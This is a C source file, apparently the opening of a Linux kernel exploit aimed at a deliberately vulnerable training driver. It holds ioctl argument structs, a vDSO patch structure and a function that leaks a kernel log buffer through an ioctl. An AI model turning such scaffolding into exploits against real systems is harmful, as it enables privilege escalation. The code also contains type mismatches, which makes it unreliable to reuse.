#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/fb.h> 

#include <sys/prctl.h>   //prctl
#include <sys/auxv.h>    //AT_SYSINFO_EHDR
#include "vulnerable_driver/src/vuln_driver.h"
struct vdso_patch {
	unsigned char *patch;
	unsigned char *copy;
	size_t size;
	void *addr;
};
#define BUFF_SIZE 96
static struct vdso_patch vdso_patch[2];


struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
typedef struct log_read_args {
	char *buff;
	size_t * count;
}log_read_args;
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};

int get_log(int fd){
	size_t addr;
	char *buff=(char*)malloc(0x1000);
	int count=0;
	struct log_read_args r_args;
	int ret;
	r_args.buff=buff;
	r_args.count=&count;
	ret=ioctl(fd,GET_KLOG,&r_args);   // read
	char *Ptr = NULL; 
	Ptr = (char *)malloc(count); 
	if (NULL == Ptr) 
	{ 
	exit (1); 
	}
	printf("buff: %s count: %d \n",r_args.buff,count);
	memcpy(Ptr,r_args.buff,count);
	//printf("%s \n",Ptr);
	//puts(Ptr);
	free(Ptr);
	Ptr = NULL; 
}